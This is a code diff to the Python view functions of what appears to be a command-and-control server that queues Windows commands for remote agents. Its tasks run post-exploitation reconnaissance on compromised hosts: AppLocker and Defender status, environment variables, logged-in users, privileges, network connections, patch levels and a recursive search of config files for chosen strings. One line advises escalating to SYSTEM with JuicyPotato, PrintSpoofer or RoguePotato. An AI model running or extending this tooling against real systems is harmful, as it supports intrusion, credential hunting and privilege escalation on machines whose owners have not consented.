@@ -25,7 +25,7 @@ def DirectoryListing(request):
 def Applocker(request):
     if request.method=='POST':
         agent = request.POST['agent']
-        task = 'echo "===============AppLocker Rules===============";Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections;echo "===============AppLocker Policy Test===============";Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone'
+        task = 'echo "===============AppLocker_Rules===============";Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections;echo "===============AppLocker Policy Test===============";Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -54,7 +54,7 @@ def Download(request):
 def env_var(request):
     if request.method=='POST':
         agent = request.POST['agent']
-        task = 'echo "===============All environment variables===============";Get-ChildItem Env:'
+        task = 'echo "===============All_environment_variables===============";Get-ChildItem Env:'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -68,7 +68,7 @@ def Phrase_finder(request):
     if request.method=='POST':
         agent = request.POST['agent']
         phrase = request.POST['phrase']
-        task = 'echo "===============All files contain "{}"===============";findstr /SIM /C:"{}" *.txt *ini *.cfg *.config *.xml'.format(phrase , phrase)
+        task = 'echo "===============All_files_contain_"{}"===============";findstr /SIM /C:"{}" *.txt *ini *.cfg *.config *.xml'.format(phrase , phrase)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -83,7 +83,7 @@ def Phrase_finder(request):
 def IPsWindows(request):
     if request.method=='POST':
         agent = request.POST['agent']
-        task = 'echo "===============Interface, IP address and DNS information===============";ipconfig /all; echo "===============arp table information===============";arp -a'
+        task = 'echo "===============Interface,IP_and_DNS_information===============";ipconfig /all; echo "===============arp table information===============";arp -a'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -97,7 +97,7 @@ def IPsWindows(request):
 def logged_users(request):
     if request.method=='POST':
         agent = request.POST['agent']
-        task = 'echo "===============Logged-in users===============";query user'
+        task = 'echo "===============LoggedIn_users===============";query user'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -110,7 +110,7 @@ def logged_users(request):
 def Net_Connections(request):
     if request.method=='POST':
         agent = request.POST['agent']
-        task = 'echo "===============Network connections===============";netstat -ano'
+        task = 'echo "===============Network_connections===============";netstat -ano'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -123,7 +123,7 @@ def Net_Connections(request):
 def Programs(request):
     if request.method=='POST':
         agent = request.POST['agent']
-        task = 'echo "===============Installed programs===============";Get-WmiObject -Class Win32_Product |  select Name, Version '
+        task = 'echo "===============Installed_programs===============";Get-WmiObject -Class Win32_Product |  select Name, Version '
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -136,7 +136,7 @@ def Programs(request):
 def processes(request):
     if request.method=='POST':
         agent = request.POST['agent']
-        task = 'echo "===============Running processes===============";tasklist /svc'
+        task = 'echo "===============Running_processes===============";tasklist /svc'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -164,7 +164,7 @@ def ScreenShot(request):
 def user_info(request):
     if request.method=='POST':
         agent = request.POST['agent']
-        task = 'echo "===============Current user===============";whoami;echo "===============User Privileges===============";echo "If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM USE JuicyPotato of PrintSpoofer or RougePotato.";whoami /priv;echo "===============User group information===============";whoami /groups'
+        task = 'echo "===============Current_user===============";whoami;echo "===============User_Privileges===============";echo "If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM USE JuicyPotato of PrintSpoofer or RougePotato.";whoami /priv;echo "===============User_group_information===============";whoami /groups'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -177,7 +177,7 @@ def user_info(request):
 def Systeminfo(request):
     if request.method=='POST':
         agent = request.POST['agent']
-        task = 'echo "===============System-Info===============";systeminfo;echo "===============Get Password Policy & Other Account Information===============";net accounts;echo "===============All system users===============";net user;echo "===============All system groups===============";net localgroup'
+        task = 'echo "===============System_Info===============";systeminfo;echo "===============Get_Password_Policy_and_Other_Account_Information===============";net accounts;echo "===============All_system_users===============";net user;echo "===============All_system_groups===============";net localgroup'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -193,7 +193,7 @@ def Systeminfo(request):
 def UpdatesWindows(request):
     if request.method=='POST':
         agent = request.POST['agent']
-        task = 'echo "===============Patches and Updates===============";wmic qfe;Get-HotFix | ft -AutoSize'
+        task = 'echo "===============Patches_and_Updates===============";wmic qfe;Get-HotFix | ft -AutoSize'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -223,7 +223,7 @@ def UploadFileWindows(request):
 def WinDefStat(request):
     if request.method=='POST':
         agent = request.POST['agent']
-        task = 'echo "===============Windows Defender Status===============";Get-MpComputerStatus'
+        task = 'echo "===============Windows_Defender_Status===============";Get-MpComputerStatus'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -237,7 +237,7 @@ def WinDefStat(request):
 def Named_pipes(request):
     if request.method=='POST':
         agent = request.POST['agent']
-        task = 'echo "===============List named pipes===============";cmd;pipelist.exe /accepteula'
+        task = 'echo "===============List_named_pipes===============";(get-childitem \\\.\pipe\).FullName'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
